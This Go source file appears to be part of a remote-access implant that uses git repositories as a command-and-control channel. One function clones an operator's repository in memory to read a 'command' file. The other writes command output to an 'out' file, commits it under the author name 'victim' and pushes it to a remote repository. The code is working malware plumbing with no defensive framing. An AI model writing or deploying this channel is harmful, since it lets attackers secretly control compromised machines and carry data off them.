package main

import (
	"io"
	"strings"
	"time"

	"gopkg.in/src-d/go-git.v4"
	"gopkg.in/src-d/go-git.v4/plumbing/object"
	"gopkg.in/src-d/go-git.v4/storage/memory"

	"gopkg.in/src-d/go-billy.v4/memfs"
	"gopkg.in/src-d/go-billy.v4/util"
)

func LoadCommand(repoURL string) (string, error) {

	// Cloning the Command Repo in-memory
	fs := memfs.New()
	_, err := git.Clone(memory.NewStorage(), fs, &git.CloneOptions{
		URL: repoURL,
	})
	if err != nil {
		return "", err
	}

	// Get fileHandler
	fileHandler, err := fs.Open("command")
	if err != nil {
		return "", err
	}

	// Get fileContent from fileHandler using io.ReadAll instead of ioutil.ReadAll
	fileContent, err := io.ReadAll(fileHandler)
	if err != nil {
		return "", err
	}

	// Cleaning the Command string
	command := string(fileContent)
	command = strings.TrimSuffix(command, "\n")

	return command, nil
}

// pushOutRepo pushes the output to the given repoURL
func PushOutRepo(commandOutput, repoURL string) error {
	// Cloning the Output Repo in-memory
	fs := memfs.New()
	repo, err := git.Clone(memory.NewStorage(), fs, &git.CloneOptions{
		URL: repoURL,
	})
	if err != nil {
		return err
	}

	// Storing the command output in "out" file in the repository
	fileContent := []byte(commandOutput)
	err = util.WriteFile(fs, "out", fileContent, 0644)
	if err != nil {
		return err
	}

	// Commit the out file in the memory
	worktree, err := repo.Worktree()
	if err != nil {
		return err
	}
	worktree.Add("out")
	_, err = worktree.Commit("new output", &git.CommitOptions{
		Author: &object.Signature{
			Name:  "victim",
			Email: "victim@localhost",
			When:  time.Now(),
		},
	})
	if err != nil {
		return err
	}

	// Pushing to the output repository
	err = repo.Push(&git.PushOptions{})
	if err != nil {
		return err
	}

	return nil
}
